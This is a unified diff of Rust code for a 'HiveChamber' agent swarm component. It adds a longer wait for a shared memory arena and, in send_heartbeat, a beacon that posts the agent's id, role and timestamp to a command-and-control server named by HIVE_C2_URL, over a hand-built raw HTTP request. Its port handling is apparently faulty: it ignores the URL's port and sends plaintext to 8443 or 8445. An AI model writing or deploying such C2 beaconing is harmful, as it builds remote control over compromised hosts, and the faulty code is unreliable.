@@ -41,15 +41,17 @@ impl HiveChamber {
             }
         }
 
-        // Wait briefly for arena to be initialized by owner
-        if !arena::verify_arena(ptr) {
+        // Wait for arena to be initialized by owner (up to 3 seconds)
+        let mut retries = 0;
+        while !arena::verify_arena(ptr) && retries < 30 {
             tokio::time::sleep(std::time::Duration::from_millis(100)).await;
-            if !arena::verify_arena(ptr) {
-                return Err(std::io::Error::new(
-                    std::io::ErrorKind::NotFound,
-                    "Arena not initialized",
-                ));
-            }
+            retries += 1;
+        }
+        if !arena::verify_arena(ptr) {
+            return Err(std::io::Error::new(
+                std::io::ErrorKind::NotFound,
+                "Arena not initialized after 3s timeout",
+            ));
         }
 
         // Register in the arena
@@ -120,9 +122,22 @@ impl HiveChamber {
     }
 
     /// Send a heartbeat: update our last_heartbeat in the registry.
+    /// Also sends an optional beacon to the C2 server if HIVE_C2_URL is set.
     pub async fn send_heartbeat(&self) {
         let now = crate::utils::timestamp_now();
         arena::update_heartbeat(self.arena.as_ptr(), self.my_slot, now);
+
+        // Auto-beacon to C2 via raw HTTP (no extra deps)
+        if let Ok(c2_url) = std::env::var("HIVE_C2_URL") {
+            let beacon = format!(
+                r#"{{"type":"heartbeat","agent_id":"{}","role":"{:?}","timestamp":{}}}"#,
+                self.identity.id(), self.role(), now
+            );
+            let c2 = c2_url.clone();
+            tokio::spawn(async move {
+                send_c2_beacon(&c2, &beacon).await;
+            });
+        }
     }
 
     /// Read all NEW messages from the arena (since last read).
@@ -263,5 +278,24 @@ fn u8_to_role(val: u8) -> Role {
         4 => Role::Queen,
         5 => Role::Swarm,
         _ => Role::Worker,
+    }
+}
+
+/// Send a beacon to the C2 server via raw HTTP POST.
+async fn send_c2_beacon(c2_url: &str, body: &str) {
+    use tokio::io::AsyncWriteExt;
+    let host = c2_url
+        .trim_start_matches("https://")
+        .trim_start_matches("http://")
+        .split('/').next().unwrap_or("localhost")
+        .split(':').next().unwrap_or("localhost");
+    let port = if c2_url.contains(":844") { 8445u16 } else { 8443 };
+    let addr = format!("{}:{}", host, port);
+    let request = format!(
+        "POST /beacon HTTP/1.1\r\nHost: {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
+        host, body.len(), body
+    );
+    if let Ok(mut stream) = tokio::net::TcpStream::connect(&addr).await {
+        let _ = stream.write_all(request.as_bytes()).await;
     }
 }
